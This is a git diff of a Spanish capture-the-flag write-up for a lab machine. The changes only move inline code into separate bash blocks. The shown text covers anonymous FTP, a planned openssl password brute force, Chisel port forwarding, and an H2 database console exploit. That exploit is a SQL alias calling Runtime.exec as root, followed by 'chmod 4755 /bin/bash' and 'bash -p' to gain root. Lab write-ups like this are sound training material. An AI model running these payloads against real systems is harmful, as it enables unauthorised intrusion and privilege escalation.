@@ -56,7 +56,15 @@ ftp 10.1.10.102
 Name: anonymous
 ```
 
-Mirando los ficheros con `ls -la` encontramos un fichero oculto llamado `.drupal.txt.enc`. Lo descargamos en nuestra
+Mirando los ficheros con 
+```bash
+ ls -la 
+```
+ encontramos un fichero oculto llamado 
+```bash
+ .drupal.txt.enc 
+```
+. Lo descargamos en nuestra
 maquina de atacante.
 
 ```bash
@@ -104,7 +112,11 @@ El problema en este caso es que para leer el fichero necesitamos:
 - una contraseña
 - el modo de cifrado utlizado para encriptar
 
-Aqui tendriamos que intentar multiples modo de cifrado pero buscando por internet, vemos que el mas comun seria el `aes-256-cbc`
+Aqui tendriamos que intentar multiples modo de cifrado pero buscando por internet, vemos que el mas comun seria el 
+```bash
+ aes-256-cbc 
+```
+
 
 En modo de ejemplo, estas serian la lineas para encriptar y desencriptar un fichero con openssl:
 
@@ -118,7 +130,11 @@ En modo de ejemplo, estas serian la lineas para encriptar y desencriptar un fich
     openssl aes-256-cbc -d -in fichero.crypted -out fichero -k password123
     ```
 
-La idea aqui es crearnos un script `bruteforce.sh` que nos permite encontrar la contraseña.
+La idea aqui es crearnos un script 
+```bash
+ bruteforce.sh 
+```
+ que nos permite encontrar la contraseña.
 ## Evaluacion de vulnerabilidades {-}
 
 ### Crack ssl password {-}
@@ -163,7 +179,11 @@ En el login del puerto 80 intentamos
 - admin:password
 - admin:PencilKeyboardScanner123
 
-Y la contraseña que hemos encontrado en el contenido del fichero `drupal.txt` funciona.
+Y la contraseña que hemos encontrado en el contenido del fichero 
+```bash
+ drupal.txt 
+```
+ funciona.
 
 
 
@@ -272,16 +292,36 @@ Como ya hemos pensado en tecnicas de port forwarding, instalamos **Chisel**.
     ./chisel client 10.10.14.8:1234 R:8082:127.0.0.1:8082
     ```
 
-Ahora en firefox si vamos a la url `http://localhost:8082` ya podemos ver el contenido de la web.
+Ahora en firefox si vamos a la url 
+```bash
+ http://localhost:8082 
+```
+ ya podemos ver el contenido de la web.
 
 Si pinchamos en preferencias y despues en **Permitir conexiones desde otros ordenadores** ya podemos navegar desde la
-url `http://10.10.10.102:8082`.
+url 
+```bash
+ http://10.10.10.102:8082 
+```
+.
 
 Aqui vemos un mensaje Wrong user name or password. Esto puede passar si la **URL JDBC** ya esta en uso. 
-si cambiamos la url `jdbc:h2:~/test` por `jdbc:h2:~/EEEEEE` y pinchamos el boton conectar, Entramos en el
+si cambiamos la url 
+```bash
+ jdbc:h2:~/test 
+```
+ por 
+```bash
+ jdbc:h2:~/EEEEEE 
+```
+ y pinchamos el boton conectar, Entramos en el
 panel de control H2 database.
 
-Si en la shell buscamos con el commando `ps -faux` y buscamos el servicio **h2** vemos que el servicio a sido lanzado por
+Si en la shell buscamos con el commando 
+```bash
+ ps -faux 
+```
+ y buscamos el servicio **h2** vemos que el servicio a sido lanzado por
 el usuario root. Quiere decir que si ejecutamos commandos desde la consola h2, lo lanzariamos como usuario root.
 
 Buscamos si existe un exploit para H2 console
@@ -307,7 +347,11 @@ java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(
 CALL EXECVE('whoami')
 ```
 
-Aqui vemos **root**. Pues aqui lanzamos el commando para que la `/bin/bash` sea SUID
+Aqui vemos **root**. Pues aqui lanzamos el commando para que la 
+```bash
+ /bin/bash 
+```
+ sea SUID
 
 ```sql
 CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new \
@@ -316,7 +360,15 @@ java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(
 CALL EXECVE('chmod 4755 /bin/bash')
 ```
 
-En la shell, ya podemos comprobar que la `/bin/bash` es SUID y con el commando `bash -p` no convertimos en root
+En la shell, ya podemos comprobar que la 
+```bash
+ /bin/bash 
+```
+ es SUID y con el commando 
+```bash
+ bash -p 
+```
+ no convertimos en root
 
 ```bash
 ls -l /bin/bash
